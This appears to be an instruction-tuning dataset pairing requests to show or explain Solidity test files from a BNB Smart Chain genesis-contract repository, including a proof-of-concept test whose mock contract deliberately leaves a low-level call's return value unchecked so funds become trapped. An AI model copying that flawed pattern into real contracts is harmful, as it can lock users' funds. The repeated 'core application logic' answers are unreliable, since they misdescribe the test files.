abi.encodePacked(newVotingDelay), GOVERNOR_ADDR\n        );\n\n        console2.log(\"calldatas[0]\");\n        console2.logBytes(calldatas[0]);\n\n        uint256 proposalId = governor.propose(targets, values, calldatas, description);\n        assertEq(governor.proposeStarted(), true, \"propose should start\");\n\n        bytes32 descHash = keccak256(bytes(description));\n        console2.logBytes32(descHash);\n        assertEq(proposalId, governor.hashProposal(targets, values, calldatas, descHash), \"hashProposal\");\n\n        console2.log(\"proposalId\", proposalId);\n        console2.log(\"proposalSnapshot\", governor.proposalSnapshot(proposalId));\n        console2.log(\"now\", governor.clock());\n\n        uint256 _nowBlock = block.number;\n        uint256 _now = block.timestamp;\n        vm.roll(_nowBlock + 10);\n        vm.warp(_now + 1 days);\n\n        governor.castVote(proposalId, 1);\n\n        vm.roll(_nowBlock + 100000000);\n        vm.warp(block.timestamp + 100 days);\n\n        governor.state(proposalId);\n\n        governor.queue(proposalId);\n\n        vm.warp(block.timestamp + 102 days);\n\n        governor.execute(proposalId);\n\n        vm.stopPrank();\n    }\n\n    function testUndelegate() public {\n        address delegator = _getNextUserAddress();\n        (address validator,, address credit,) = _createValidator(2000 ether);\n        vm.startPrank(delegator);\n\n        uint256 bnbAmount = 100 ether;\n        stakeHub.delegate{ value: bnbAmount }(validator, false);\n        uint256 shares = IStakeCredit(credit).balanceOf(delegator);\n\n        // failed with not enough shares\n        vm.expectRevert();\n        stakeHub.undelegate(validator, shares + 1);\n\n        // success case\n        stakeHub.undelegate(validator, shares / 2);\n\n        // claim failed\n        vm.expectRevert();\n        stakeHub.claim(validator, 0);\n\n        // claim success\n        vm.warp(block.timestamp + 7 days);\n        uint256 balanceBefore = delegator.balance;\n        vm.expectEmit(true, true, false, true, address(stakeHub));\n        emit Claimed(validator, delegator, bnbAmount / 2);\n        stakeHub.claim(validator, 0);\n        uint256 balanceAfter = delegator.balance;\n        assertEq(balanceAfter - balanceBefore, bnbAmount / 2);\n\n        vm.stopPrank();\n    }\n\n    function testUndelegateAll() public {\n        uint256 selfDelegation = 2000 ether;\n        uint256 toLock = stakeHub.LOCK_AMOUNT();\n        (address validator,, address credit,) = _createValidator(selfDelegation);\n        uint256 _totalShares = IStakeCredit(credit).totalSupply();\n        assertEq(_totalShares, selfDelegation + toLock, \"wrong total shares\");\n        uint256 _totalPooledBNB = IStakeCredit(credit).totalPooledBNB();\n        assertEq(_totalPooledBNB, selfDelegation + toLock, \"wrong total pooled BNB\");\n\n        vm.startPrank(validator);\n\n        // 1. undelegate all\n        stakeHub.undelegate(validator, selfDelegation);\n        _totalShares = IStakeCredit(credit).totalSupply();\n        assertEq(_totalShares, toLock, \"wrong total shares\");\n        _totalPooledBNB = IStakeCredit(credit).totalPooledBNB();\n        assertEq(_totalPooledBNB, toLock, \"wrong total pooled BNB\");\n\n        // 2. delegate again\n        stakeHub.delegate{ value: selfDelegation }(validator, false);\n        _totalShares = IStakeCredit(credit).totalSupply();\n        assertEq(_totalShares, selfDelegation + toLock, \"wrong total shares\");\n        _totalPooledBNB = IStakeCredit(credit).totalPooledBNB();\n        assertEq(_totalPooledBNB, selfDelegation + toLock, \"wrong total pooled BNB\");\n\n        vm.stopPrank();\n    }\n}\n\n```"}
{"instruction": "What does the file Governor.t.sol do?", "input": "```sol\npragma solidity ^0.8.10;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\nimport \"./utils/Deployer.sol\";\n\ninterface IStakeCredit {\n    function balanceOf(address account) external view returns (uint256);\n    function totalPooledBNB() external view returns (uint256);\n    function totalSupply() external view returns (uint256);\n    function getPooledBNBByShares(uint256 shares) external view returns (uint256);\n    function getSharesByPooledBNB(uint256 bnbAmount) external view returns (uint256);\n}\n\ncontract GovernorTest is Deployer {\n    using RLPEncode for *;\n\n    event ConsensusAddressEdited(address indexed operatorAddress, address indexed newAddress);\n    event CommissionRateEdited(address indexed operatorAddress, uint64 commissionRate);\n    event DescriptionEdited(address indexed operatorAddress);\n    event VoteAddressEdited(address indexed operatorAddress, bytes newVoteAddress);\n    event RewardDistributed(address indexed operatorAddress, uint256 reward);\n    event ValidatorSlashed(address indexed operatorAddress, uint256 jailUntil, uint256 slashAmount, uint8 slashType);\n    event ValidatorUnjailed(address indexed operatorAddress);\n    event Claimed(address indexed operatorAddress, address indexed delegator, uint256 bnbAmount);\n\n    receive() external payable { }\n\n    function setUp() public {\n        vm.mockCall(address(0x66), bytes(\"\"), hex\"01\");\n    }\n\n    function testDelegateVote() public {\n        address delegator = _getNextUserAddress();\n        (address validator,, address credit,) = _createValidator(2000 ether);\n        vm.startPrank(delegator);\n\n        // success case\n        uint256 bnbAmount = 100 ether;\n        stakeHub.delegate{ value: bnbAmount }(validator, false);\n        uint256 shares = IStakeCredit(credit).balanceOf(delegator);\n        assertEq(shares, bnbAmount);\n\n        uint256 govBNBBalance = govToken.balanceOf(delegator);\n        assertEq(govBNBBalance, bnbAmount);\n\n        assertEq(govToken.getVotes(delegator), 0);\n        govToke\n```", "output": "This file `Governor.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for GovHub.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\GovHub.t.sol`:\n\n```sol\npragma solidity ^0.8.10;\n\nimport \"./utils/Deployer.sol\";\n\ncontract GovHubTest is Deployer {\n    event failReasonWithStr(string message);\n\n    function setUp() public { }\n\n    function testGovValidatorSet(uint16 value) public {\n        vm.assume(value >= 100);\n        vm.assume(value <= 1e5);\n\n        bytes memory key = \"expireTimeSecondGap\";\n        bytes memory valueBytes = abi.encode(value);\n        vm.expectEmit();\n        emit failReasonWithStr(\"unknown param\");\n        _updateParamByGovHub(key, valueBytes, address(bscValidatorSet));\n    }\n\n    function testGovTokenHub(uint256 value) public {\n        vm.assume(value > 0);\n        vm.assume(value <= 1e8);\n        value = value * 1e10;\n\n        bytes memory key = \"relayFee\";\n        bytes memory valueBytes = abi.encode(value);\n        vm.expectEmit();\n        emit failReasonWithStr(\"deprecated\");\n        _updateParamByGovHub(key, valueBytes, address(tokenHub));\n    }\n\n    function testGovLightClient(uint256 value) public {\n        vm.assume(value > 0);\n        vm.assume(value <= 1e18);\n\n        bytes memory key = \"rewardForValidatorSetChange\";\n        bytes memory valueBytes = abi.encode(value);\n        vm.expectEmit();\n        emit failReasonWithStr(\"deprecated\");\n        _updateParamByGovHub(key, valueBytes, address(lightClient));\n    }\n\n    function testGovIncentivize(uint256 value1, uint256 value2, uint256 value3) public {\n        uint256 denominator = incentivize.headerRelayerRewardRateDenominator();\n        vm.assume(value1 <= denominator);\n        vm.assume(value2 >= value1);\n        vm.assume(value2 > 0);\n        vm.assume(value3 > 0);\n        vm.assume(value3 >= value1);\n\n        bytes memory key = \"headerRelayerRewardRateMolecule\";\n        bytes memory valueBytes = abi.encode(value1);\n        vm.expectEmit();\n        emit failReasonWithStr(\"deprecated\");\n        _updateParamByGovHub(key, valueBytes, address(incentivize));\n    }\n\n    function testGovCrossChain(uint16 value) public {\n        vm.assume(value >= 10);\n        vm.assume(value <= 10000);\n\n        bytes memory key = \"batchSizeForOracle\";\n        bytes memory valueBytes = abi.encode(value);\n        vm.expectEmit();\n        emit failReasonWithStr(\"deprecated\");\n        _updateParamByGovHub(key, valueBytes, address(crossChain));\n\n        key = \"addOrUpdateChannel\";\n        valueBytes = abi.encodePacked(uint8(0x58), uint8(0x00), address(incentivize));\n        vm.expectEmit();\n        emit failReasonWithStr(\"deprecated\");\n        _updateParamByGovHub(key, valueBytes, address(crossChain));\n\n        key = \"enableOrDisableChannel\";\n        valueBytes = abi.encodePacked(uint8(0x58), uint8(0x00));\n        vm.expectEmit();\n        emit failReasonWithStr(\"deprecated\");\n        _updateParamByGovHub(key, valueBytes, address(crossChain));\n\n        valueBytes = abi.encodePacked(uint8(0x58), uint8(0x01));\n        vm.expectEmit();\n        emit failReasonWithStr(\"deprecated\");\n        _updateParamByGovHub(key, valueBytes, address(crossChain));\n    }\n\n    function testGovSlash(uint16 value1, uint16 value2) public {\n        uint256 misdemeanorThreshold = slashIndicator.misdemeanorThreshold();\n        vm.assume(uint256(value1) > misdemeanorThreshold);\n        vm.assume(value1 <= 1000);\n        vm.assume(value2 < value1);\n        vm.assume(value2 > 0);\n\n        bytes memory key = \"felonyThreshold\";\n        bytes memory valueBytes = abi.encode(value1);\n        vm.expectEmit(false, false, false, true, address(slashIndicator));\n        emit paramChange(string(key), valueBytes);\n        _updateParamByGovHub(key, valueBytes, address(slashIndicator));\n        assertEq(uint256(value1), slashIndicator.felonyThreshold());\n\n        key = \"misdemeanorThreshold\";\n        valueBytes = abi.encode(value2);\n        vm.expectEmit(false, false, false, true, address(slashIndicator));\n        emit paramChange(string(key), valueBytes);\n        _updateParamByGovHub(key, valueBytes, address(slashIndicator));\n        assertEq(uint256(value2), slashIndicator.misdemeanorThreshold());\n    }\n}\n\n```"}
{"instruction": "What does the file GovHub.t.sol do?", "input": "```sol\npragma solidity ^0.8.10;\n\nimport \"./utils/Deployer.sol\";\n\ncontract GovHubTest is Deployer {\n    event failReasonWithStr(string message);\n\n    function setUp() public { }\n\n    function testGovValidatorSet(uint16 value) public {\n        vm.assume(value >= 100);\n        vm.assume(value <= 1e5);\n\n        bytes memory key = \"expireTimeSecondGap\";\n        bytes memory valueBytes = abi.encode(value);\n        vm.expectEmit();\n        emit failReasonWithStr(\"unknown param\");\n        _updateParamByGovHub(key, valueBytes, address(bscValidatorSet));\n    }\n\n    function testGovTokenHub(uint256 value) public {\n        vm.assume(value > 0);\n        vm.assume(value <= 1e8);\n        value = value * 1e10;\n\n        bytes memory key = \"relayFee\";\n        bytes memory valueBytes = abi.encode(value);\n        vm.expectEmit();\n        emit failReasonWithStr(\"deprecated\");\n        _updateParamByGovHub(key, valueBytes, address(tokenHub));\n    }\n\n    function testGovLightClient(uint256 value) public {\n        vm.assume(value > 0);\n        vm.assume(value <= 1e18);\n\n        bytes memory key = \"rewardForValidatorSetChange\";\n        bytes memory valueBytes = abi.encode(value);\n        vm.expectEmit();\n        emit failReasonWithStr(\"deprecated\");\n        _updateParamByGovHub(key, valueBytes, address(lightClient));\n    }\n\n    function testGovIncentivize(uint256 value1, uint256 value2, uint256 value3) public {\n        uint256 denominator = incentivize.headerRelayerRewardRateDenominator();\n        vm.assume(value1 <= denominator);\n        vm.assume(value2 >= value1);\n        vm.assume(value2 > 0);\n        vm.assume(value3 > 0);\n        vm.assume(value3 >= value1);\n\n        bytes memory key = \"headerRelayerRewardRateMolecule\";\n        bytes memory valueBytes = abi.encode(value1);\n        vm.expectEmit();\n        emit failReasonWithStr(\"deprecated\");\n        _updateParamByGovHub(key, valueBytes, address(incentivize));\n    }\n\n    function testGovCrossChain(uint16 value) public {\n        vm.assume(valu\n```", "output": "This file `GovHub.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for H02_UncheckedReturn.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\H02_UncheckedReturn.t.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n/**\n * @title H02_UncheckedReturn_Test\n * @notice PoC for unchecked return value vulnerability in StakeHub.distributeReward()\n * @dev Run with: forge test --match-contract H02_UncheckedReturn -vvvv\n */\n\n// Interface for StakeHub\ninterface IStakeHub {\n    function distributeReward(address consensusAddress) external payable;\n    function consensusToOperator(address) external view returns (address);\n}\n\n// Interface for SystemReward\ninterface ISystemReward {\n    function claimRewards(address payable to, uint256 amount) external returns (uint256);\n}\n\n// Simplified mock to demonstrate the vulnerability\ncontract MockStakeHub {\n    address public SYSTEM_REWARD_ADDR;\n\n    mapping(address => address) public consensusToOperator;\n    mapping(address => address) public creditContract;\n    mapping(address => bool) public isJailed;\n\n    event RewardDistributeFailed(address indexed validator, string reason);\n    event RewardDistributed(address indexed validator, uint256 amount);\n\n    constructor(address _systemReward) {\n        SYSTEM_REWARD_ADDR = _systemReward;\n    }\n\n    function setValidator(\n        address consensus,\n        address operator,\n        address credit,\n        bool jailed\n    ) external {\n        consensusToOperator[consensus] = operator;\n        creditContract[operator] = credit;\n        isJailed[operator] = jailed;\n    }\n\n    /**\n     * @dev VULNERABLE: Replicates exact behavior of StakeHub.sol:650-665\n     *      The return value of .call() is NOT checked\n     */\n    function distributeReward(address consensusAddress) external payable {\n        address operatorAddress = consensusToOperator[consensusAddress];\n        address credit = creditContract[operatorAddress];\n        bool jailed = isJailed[operatorAddress];\n\n        if (credit == address(0) || jailed) {\n            // VULNERABILITY: Return value not checked!\n            // If this fails, msg.value stays in this contract forever\n            SYSTEM_REWARD_ADDR.call{ value: msg.value }(\"\");\n            emit RewardDistributeFailed(operatorAddress, \"INVALID_VALIDATOR\");\n            return;\n        }\n\n        emit RewardDistributed(operatorAddress, msg.value);\n    }\n\n    function getBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n// Mock SystemReward that can reject transfers\ncontract MockSystemReward {\n    bool public shouldReject;\n    uint256 public totalReceived;\n\n    event Received(address from, uint256 amount);\n\n    function setReject(bool _reject) external {\n        shouldReject = _reject;\n    }\n\n    receive() external payable {\n        if (shouldReject) {\n            revert(\"Rejecting transfer\");\n        }\n        totalReceived += msg.value;\n        emit Received(msg.sender, msg.value);\n    }\n}\n\ncontract H02_UncheckedReturn_Test is Test {\n    MockStakeHub public stakeHub;\n    MockSystemReward public systemReward;\n\n    address constant VALIDATOR_CONSENSUS = address(0x1111);\n    address constant VALIDATOR_OPERATOR = address(0x2222);\n\n    function setUp() public {\n        // Deploy mocks\n        systemReward = new MockSystemReward();\n        stakeHub = new MockStakeHub(address(systemReward));\n\n        // Setup an invalid validator (creditContract = 0, triggers vulnerable path)\n        stakeHub.setValidator(\n            VALIDATOR_CONSENSUS,\n            VALIDATOR_OPERATOR,\n            address(0),  // No credit contract - triggers vulnerable code\n            false\n        );\n\n        // Fund the test\n        vm.deal(address(this), 100 ether);\n    }\n\n    /**\n     * @notice Test 1: Normal operation when SystemReward accepts\n     */\n    function test_NormalOperation_FundsReachSystemReward() public {\n        // SystemReward accepts transfers\n        systemReward.setReject(false);\n\n        uint256 systemBalanceBefore = address(systemReward).balance;\n        uint256 stakeHubBalanceBefore = stakeHub.getBalance();\n\n        // Send rewards\n        stakeHub.distributeReward{value: 1 ether}(VALIDATOR_CONSENSUS);\n\n        // Verify funds reached SystemReward\n        assertEq(\n            address(systemReward).balance,\n            systemBalanceBefore + 1 ether,\n            \"Funds should reach SystemReward\"\n        );\n        assertEq(\n            stakeHub.getBalance(),\n            stakeHubBalanceBefore,\n            \"StakeHub should have 0 balance\"\n        );\n\n        emit log_string(\"[OK] Normal operation: funds transferred successfully\");\n    }\n\n    /**\n     * @notice Test 2: VULNERABILITY - Funds trapped when SystemReward rejects\n     */\n    function test_VULNERABILITY_FundsTrapped() public {\n        // SystemReward starts rejecting (simulates bad upgrade)\n        systemReward.setReject(true);\n\n        uint256 stakeHubBalanceBefore = stakeHub.getBalance();\n\n        // This call DOES NOT REVERT - that's the bug!\n        // The transaction \"succeeds\" but funds are trapped\n        stakeHub.distributeReward{value: 1 ether}(VALIDATOR_CONSENSUS);\n\n        // CRITICAL: Funds are now TRAPPED in StakeHub!\n        assertEq(\n            stakeHub.getBalance(),\n            stakeHubBalanceBefore + 1 ether,\n            \"VULNERABILITY CONFIRMED: Funds trapped in StakeHub\"\n        );\n\n        // SystemReward received nothing\n        assertEq(\n            address(systemReward).balance,\n            0,\n            \"SystemReward should have received nothing\"\n        );\n\n        emit log_string(\"\");\n        emit log_string(\"================================================\");\n        emit log_string(\"  VULNERABILITY CONFIRMED!\");\n        emit log_string(\"================================================\");\n        emit log_named_uint(\"  Trapped funds (wei)\", stakeHub.getBalance());\n        emit log_string(\"  These funds are PERMANENTLY LOST\");\n        emit log_string(\"  No recovery mechanism exists in StakeHub\");\n        emit log_string(\"================================================\");\n    }\n\n    /**\n     * @notice Test 3: Compounded loss over multiple distributions\n     */\n    function test_CompoundedLoss_MultipleDistributions() public {\n        systemReward.setReject(true);\n\n        // Simulate 10 epoch distributions\n        for (uint256 i = 0; i < 10; i++) {\n            stakeHub.distributeReward{value: 1 ether}(VALIDATOR_CONSENSUS);\n        }\n\n        // 10 ETH trapped forever\n        assertEq(stakeHub.getBalance(), 10 ether);\n\n        emit log_string(\"\");\n        emit log_string(\"After 10 failed distributions:\");\n        emit log_named_uint(\"Total trapped (wei)\", stakeHub.getBalance());\n        emit log_string(\"In production, this could be millions in BNB\");\n    }\n\n    /**\n     * @notice Test 4: Jailed validator also triggers vulnerable path\n     */\n    function test_JailedValidator_AlsoVulnerable() public {\n        // Setup a jailed validator with valid credit contract\n        address JAILED_CONSENSUS = address(0x3333);\n        address JAILED_OPERATOR = address(0x4444);\n\n        stakeHub.setValidator(\n            JAILED_CONSENSUS,\n            JAILED_OPERATOR,\n            address(0x5555), // Has credit contract\n            true              // But is jailed\n        );\n\n        systemReward.setReject(true);\n\n        stakeHub.distributeReward{value: 1 ether}(JAILED_CONSENSUS);\n\n        assertEq(\n            stakeHub.getBalance(),\n            1 ether,\n            \"Jailed validators also affected\"\n        );\n\n        emit log_string(\"[!] Jailed validators with pending rewards also vulnerable\");\n    }\n}\n\n```"}
{"instruction": "What does the file H02_UncheckedReturn.t.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n/**\n * @title H02_UncheckedReturn_Test\n * @notice PoC for unchecked return value vulnerability in StakeHub.distributeReward()\n * @dev Run with: forge test --match-contract H02_UncheckedReturn -vvvv\n */\n\n// Interface for StakeHub\ninterface IStakeHub {\n    function distributeReward(address consensusAddress) external payable;\n    function consensusToOperator(address) external view returns (address);\n}\n\n// Interface for SystemReward\ninterface ISystemReward {\n    function claimRewards(address payable to, uint256 amount) external returns (uint256);\n}\n\n// Simplified mock to demonstrate the vulnerability\ncontract MockStakeHub {\n    address public SYSTEM_REWARD_ADDR;\n\n    mapping(address => address) public consensusToOperator;\n    mapping(address => address) public creditContract;\n    mapping(address => bool) public isJailed;\n\n    event RewardDistributeFailed(address indexed validator, string reason);\n    event RewardDistributed(address indexed validator, uint256 amount);\n\n    constructor(address _systemReward) {\n        SYSTEM_REWARD_ADDR = _systemReward;\n    }\n\n    function setValidator(\n        address consensus,\n        address operator,\n        address credit,\n        bool jailed\n    ) external {\n        consensusToOperator[consensus] = operator;\n        creditContract[operator] = credit;\n        isJailed[operator] = jailed;\n    }\n\n    /**\n     * @dev VULNERABLE: Replicates exact behavior of StakeHub.sol:650-665\n     *      The return value of .call() is NOT checked\n     */\n    function distributeReward(address consensusAddress) external payable {\n        address operatorAddress = consensusToOperator[consensusAddress];\n        address credit = creditContract[operatorAddress];\n        bool jailed = isJailed[operatorAddress];\n\n        if (credit == address(0) || jailed) {\n            // VULNERABILITY: Return value not checked!\n            // If this fails, msg.value stays in this contra\n```", "output": "This file `H02_UncheckedReturn.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for SlashIndicator.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\SlashIndicator.t.sol`:\n\n```sol\npragma solidity ^0.8.10;\n\nimport \"./utils/Deployer.sol\";\n\ncontract SlashIndicatorTest is Deployer {\n    event validatorSlashed(address indexed validator0);\n    event ValidatorSlashed(address indexed operatorAddress, uint256 jailUntil, uint256 slashAmount, uint8 slashType);\n\n    uint256 public burnRatio;\n    uint256 public burnRatioScale;\n    uint256 public systemRewardBaseRatio;\n    uint256 public systemRewardRatioScale;\n\n    address public coinbase;\n    address public validator0;\n    address public validatorLast;\n\n    uint256 public constant MISDEMEANOR_THRESHOLD = 200;\n    uint256 public constant FELONY_THRESHOLD = 600;\n\n    function setUp() public {\n        burnRatio =\n            bscValidatorSet.isSystemRewardIncluded() ? bscValidatorSet.burnRatio() : bscValidatorSet.INIT_BURN_RATIO();\n        burnRatioScale = bscValidatorSet.BLOCK_FEES_RATIO_SCALE();\n\n        systemRewardBaseRatio = bscValidatorSet.isSystemRewardIncluded()\n            ? bscValidatorSet.systemRewardBaseRatio()\n            : bscValidatorSet.INIT_SYSTEM_REWARD_RATIO();\n        systemRewardRatioScale = bscValidatorSet.BLOCK_FEES_RATIO_SCALE();\n\n        address[] memory validators = bscValidatorSet.getValidators();\n        validator0 = validators[0];\n        validatorLast = validators[validators.length - 1];\n\n        coinbase = block.coinbase;\n        vm.deal(coinbase, 100 ether);\n\n        // set gas price to zero to send system slash tx\n        vm.txGasPrice(0);\n        vm.mockCall(address(0x66), bytes(\"\"), hex\"01\");\n    }\n\n    function testGov() public {\n        bytes memory key = \"misdemeanorThreshold\";\n        bytes memory value = bytes(hex\"0000000000000000000000000000000000000000000000000000000000000064\"); // 100\n        _updateParamByGovHub(key, value, address(slashIndicator));\n        assertEq(slashIndicator.misdemeanorThreshold(), 100);\n\n        key = \"felonyThreshold\";\n        value = bytes(hex\"00000000000000000000000000000000000000000000000000000000000000c8\"); // 200\n        _updateParamByGovHub(key, value, address(slashIndicator));\n        assertEq(slashIndicator.felonyThreshold(), 200);\n\n        key = \"felonySlashRewardRatio\";\n        value = bytes(hex\"0000000000000000000000000000000000000000000000000000000000000032\"); // 50\n        _updateParamByGovHub(key, value, address(slashIndicator));\n        assertEq(slashIndicator.felonySlashRewardRatio(), 50);\n    }\n\n    function testSlash() public {\n        vm.expectRevert(bytes(\"the message sender must be the block producer\"));\n        slashIndicator.slash(validator0);\n\n        vm.startPrank(coinbase);\n        (, uint256 origin) = slashIndicator.getSlashIndicator(validator0);\n        for (uint256 i = 1; i < 10; ++i) {\n            vm.expectEmit(true, false, false, true, address(slashIndicator));\n            emit validatorSlashed(validator0);\n            slashIndicator.slash(validator0);\n            vm.roll(block.number + 1);\n            (, uint256 count) = slashIndicator.getSlashIndicator(validator0);\n            assertEq(origin + i, count);\n        }\n        vm.stopPrank();\n    }\n\n    function testMaintenance() public {\n        vm.prank(validator0);\n        bscValidatorSet.enterMaintenance();\n\n        (, uint256 countBefore) = slashIndicator.getSlashIndicator(validator0);\n        vm.prank(coinbase);\n        slashIndicator.slash(validator0);\n        (, uint256 countAfter) = slashIndicator.getSlashIndicator(validator0);\n        assertEq(countAfter, countBefore);\n\n        vm.prank(validator0);\n        vm.expectRevert(bytes(\"can not enter Temporary Maintenance\"));\n        bscValidatorSet.enterMaintenance();\n\n        // exit maintenance\n        vm.prank(validator0);\n        bscValidatorSet.exitMaintenance();\n        vm.roll(block.number + 1);\n        vm.prank(coinbase);\n        slashIndicator.slash(validator0);\n        (, countAfter) = slashIndicator.getSlashIndicator(validator0);\n        assertEq(countAfter, countBefore + 1);\n\n        vm.prank(validator0);\n        vm.expectRevert(bytes(\"can not enter Temporary Maintenance\"));\n        bscValidatorSet.enterMaintenance();\n    }\n\n    function testMisdemeanor() public {\n        (, address[] memory consensusAddrs, uint64[] memory votingPowers, bytes[] memory voteAddrs) =\n            _batchCreateValidators(21);\n\n        vm.startPrank(coinbase);\n        bscValidatorSet.updateValidatorSetV2(consensusAddrs, votingPowers, voteAddrs);\n\n        uint256 _deposit = 1 ether;\n        uint256 _incoming = _calcIncoming(_deposit);\n        bscValidatorSet.deposit{ value: _deposit }(consensusAddrs[0]);\n        assertEq(_incoming, bscValidatorSet.getIncoming(consensusAddrs[0]));\n\n        for (uint256 i; i < MISDEMEANOR_THRESHOLD; ++i) {\n            vm.roll(block.number + 1);\n            slashIndicator.slash(consensusAddrs[0]);\n        }\n        (, uint256 count) = slashIndicator.getSlashIndicator(consensusAddrs[0]);\n        assertEq(MISDEMEANOR_THRESHOLD, count);\n        assertEq(0, bscValidatorSet.getIncoming(consensusAddrs[0]));\n\n        // enter maintenance, cannot be slashed\n        vm.roll(block.number + 1);\n        slashIndicator.slash(consensusAddrs[0]);\n        (, count) = slashIndicator.getSlashIndicator(consensusAddrs[0]);\n        assertEq(MISDEMEANOR_THRESHOLD, count);\n\n        address[] memory newVals = new address[](3);\n        uint64[] memory newVotingPowers = new uint64[](3);\n        bytes[] memory newVoteAddrs = new bytes[](3);\n        for (uint256 i; i < 3; ++i) {\n            newVals[i] = consensusAddrs[i];\n            newVotingPowers[i] = votingPowers[i];\n            newVoteAddrs[i] = voteAddrs[i];\n        }\n        bscValidatorSet.updateValidatorSetV2(newVals, newVotingPowers, newVoteAddrs);\n\n        bscValidatorSet.deposit{ value: 2 ether }(newVals[0]);\n        assertEq(_incoming * 2, bscValidatorSet.getIncoming(newVals[0]));\n\n        for (uint256 i; i < 152; ++i) {\n            vm.roll(block.number + 1);\n            slashIndicator.slash(newVals[0]);\n        }\n        (, count) = slashIndicator.getSlashIndicator(newVals[0]);\n        assertEq(MISDEMEANOR_THRESHOLD, count);\n        assertEq(0, bscValidatorSet.getIncoming(newVals[0]));\n        assertEq(_incoming, bscValidatorSet.getIncoming(newVals[1]));\n        assertEq(_incoming, bscValidatorSet.getIncoming(newVals[2]));\n\n        bscValidatorSet.deposit{ value: _deposit }(newVals[1]);\n        assertEq(_incoming * 2, bscValidatorSet.getIncoming(newVals[1]));\n        for (uint256 i; i < MISDEMEANOR_THRESHOLD; ++i) {\n            vm.roll(block.number + 1);\n            slashIndicator.slash(newVals[1]);\n        }\n        assertEq(_incoming, bscValidatorSet.getIncoming(newVals[0]));\n        assertEq(0, bscValidatorSet.getIncoming(newVals[1]));\n        assertEq(_incoming * 2, bscValidatorSet.getIncoming(newVals[2]));\n\n        assertEq(_incoming * 2, bscValidatorSet.getIncoming(newVals[2]));\n        for (uint256 i; i < MISDEMEANOR_THRESHOLD; ++i) {\n            vm.roll(block.number + 1);\n            slashIndicator.slash(newVals[2]);\n        }\n        assertEq(_incoming * 2, bscValidatorSet.getIncoming(newVals[0]));\n        assertEq(_incoming, bscValidatorSet.getIncoming(newVals[1]));\n        assertEq(0, bscValidatorSet.getIncoming(newVals[2]));\n        vm.stopPrank();\n    }\n\n    function testFelony() public {\n        (, address[] memory consensusAddrs, uint64[] memory votingPowers, bytes[] memory voteAddrs) =\n            _batchCreateValidators(3);\n\n        vm.startPrank(coinbase);\n        bscValidatorSet.updateValidatorSetV2(consensusAddrs, votingPowers, voteAddrs);\n\n        uint256 _deposit = 1 ether;\n        uint256 _incoming = _calcIncoming(_deposit);\n        bscValidatorSet.deposit{ value: _deposit }(consensusAddrs[0]);\n        assertEq(_incoming, bscValidatorSet.getIncoming(consensusAddrs[0]));\n\n        for (uint256 i; i < MISDEMEANOR_THRESHOLD; ++i) {\n            vm.roll(block.number + 1);\n            slashIndicator.slash(consensusAddrs[0]);\n        }\n        (, uint256 count) = slashIndicator.getSlashIndicator(consensusAddrs[0]);\n        assertEq(MISDEMEANOR_THRESHOLD, count);\n        assertEq(0, bscValidatorSet.getIncoming(consensusAddrs[0]));\n        vm.stopPrank();\n\n        vm.prank(consensusAddrs[0]);\n        bscValidatorSet.exitMaintenance();\n\n        vm.startPrank(coinbase);\n        bscValidatorSet.deposit{ value: _deposit }(consensusAddrs[0]);\n        for (uint256 i; i < FELONY_THRESHOLD - MISDEMEANOR_THRESHOLD; ++i) {\n            vm.roll(block.number + 1);\n            slashIndicator.slash(consensusAddrs[0]);\n        }\n        (, count) = slashIndicator.getSlashIndicator(consensusAddrs[0]);\n        assertEq(0, count);\n        assertEq(0, bscValidatorSet.getIncoming(consensusAddrs[0]));\n        assertEq(_incoming, bscValidatorSet.getIncoming(consensusAddrs[1]));\n        assertEq(_incoming, bscValidatorSet.getIncoming(consensusAddrs[2]));\n\n        address[] memory vals = bscValidatorSet.getValidators();\n        assertEq(2, vals.length);\n        vm.stopPrank();\n    }\n\n    function testClean() public {\n        (, address[] memory consensusAddrs, uint64[] memory votingPowers, bytes[] memory voteAddrs) =\n            _batchCreateValidators(20);\n\n        // case 1: all clean.\n        vm.startPrank(coinbase);\n        bscValidatorSet.updateValidatorSetV2(consensusAddrs, votingPowers, voteAddrs);\n\n        for (uint256 i; i < consensusAddrs.length; ++i) {\n            vm.roll(block.number + 1);\n            slashIndicator.slash(consensusAddrs[i]);\n        }\n\n        // do clean\n        bscValidatorSet.updateValidatorSetV2(consensusAddrs, votingPowers, voteAddrs);\n\n        uint256 count;\n        for (uint256 i; i < consensusAddrs.length; ++i) {\n            (, count) = slashIndicator.getSlashIndicator(consensusAddrs[i]);\n            assertEq(0, count);\n        }\n\n        // case 2: all stay.\n        uint256 slashCount = 1 + slashIndicator.felonyThreshold() / slashIndicator.DECREASE_RATE();\n        for (uint256 i; i < consensusAddrs.length; ++i) {\n            for (uint256 j; j < slashCount; ++j) {\n                vm.roll(block.number + 1);\n                slashIndicator.slash(consensusAddrs[i]);\n            }\n        }\n\n        // do clean\n        bscValidatorSet.updateValidatorSetV2(consensusAddrs, votingPowers, voteAddrs);\n\n        for (uint256 i; i < consensusAddrs.length; ++i) {\n            (, count) = slashIndicator.getSlashIndicator(consensusAddrs[i]);\n            assertEq(1, count);\n        }\n\n        // case 3: partial stay.\n        for (uint256 i; i < 10; ++i) {\n            for (uint256 j; j < slashCount; ++j) {\n                vm.roll(block.number + 1);\n                slashIndicator.slash(consensusAddrs[2 * i]);\n            }\n            vm.roll(block.number + 1);\n            slashIndicator.slash(consensusAddrs[2 * i + 1]);\n        }\n\n        // do clean\n        bscValidatorSet.updateValidatorSetV2(consensusAddrs, votingPowers, voteAddrs);\n\n        for (uint256 i; i < 10; ++i) {\n            (, count) = slashIndicator.getSlashIndicator(consensusAddrs[i]);\n            if (i % 2 == 0) {\n                assertEq(2, count);\n            } else {\n 